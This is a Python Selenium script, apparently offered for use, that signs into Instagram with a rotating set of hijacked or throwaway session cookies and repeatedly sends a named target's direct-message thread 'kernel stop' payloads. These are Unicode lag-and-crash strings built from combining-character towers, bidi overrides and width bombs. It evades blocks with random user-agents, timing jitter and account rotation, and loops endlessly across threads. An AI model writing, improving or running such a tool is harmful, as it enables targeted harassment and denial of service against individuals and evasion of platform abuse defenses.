# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (STABLE-ROTATOR)
# 📅 STATUS: DENSITY x80 | ACCOUNT-ROTATION | WAIT-STABILITY

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_kernel_stop_payload(target_name):
    """The PRAVEER.OWNS Edition: High-style, High-lag."""
    u_id = random.randint(1000, 9999)
    header = (
        f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n"
        f"『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』\n"
        f"🆔 𝖀𝕴𝕯-{MACHINE_ID}-{u_id}\n"
    )
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(400))
    z_tower = "̸" * 800
    width_bomb = "\u2800\u00A0" * 200
    lines = [header, shifter, width_bomb]
    for i in range(42):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=4))
        styled_target = target_name.upper().replace('A', '𝕬').replace('E', '𝕰').replace('I', '𝕴').replace('O', '𝕺').replace('U', '𝖀')
        lines.append(f"{width_bomb}{prefix}{styled_target}_{noise}{z_tower}{shifter}")
    return "\n".join(lines)[:10000]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    ver = random.randint(122, 126)
    chrome_options.add_argument(f"user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def agent_blitz(agent_id, cookie_list, target_id, target_name):
    account_idx = agent_id % len(cookie_list)
    
    while True:
        driver = None
        current_cookie = cookie_list[account_idx].strip()
        print(f"📡 [Agent {agent_id}] Testing Account #{account_idx}...")
        
        try:
            driver = get_driver()
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': current_cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(8)
            
            if "login" in driver.current_url:
                print(f"❌ [Agent {agent_id}] Account #{account_idx} DEAD. Rotating...")
                account_idx = (account_idx + 1) % len(cookie_list)
                driver.quit()
                continue

            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            
            # ✅ STABILITY: Wait up to 30s for the UI to load
            wait = WebDriverWait(driver, 30)
            box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))

            strike_count = 0
            while True:
                payload = get_kernel_stop_payload(target_name)
                
                # Injection via JS to bypass "interactable" errors
                driver.execute_script("""
                    var box = arguments[0];
                    document.execCommand('insertText', false, arguments[1]);
                    box.dispatchEvent(new Event('input', { bubbles: true }));
                """, box, payload)
                
                box.send_keys(Keys.ENTER)
                strike_count += 1
                print(f"💀 [Agent {agent_id}] Strike {strike_count} Delivered (Acc #{account_idx})")
                
                driver.execute_script("window.stop();")
                
                # Jitter to avoid server-side blocks
                time.sleep(random.uniform(5, 9)) 

                if strike_count % 12 == 0:
                    driver.refresh()
                    time.sleep(10)

        except Exception as e:
            print(f"⚠️ [Agent {agent_id}] UI Error/Block: Rotating to next account...")
            account_idx = (account_idx + 1) % len(cookie_list)
            if driver: driver.quit()
            time.sleep(5)

def main():
    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    if not raw_cookies or len(raw_cookies[0]) < 10:
        print("❌ NO SESSION IDS FOUND")
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, raw_cookies, target_id, target_name)

if __name__ == "__main__":
    main()
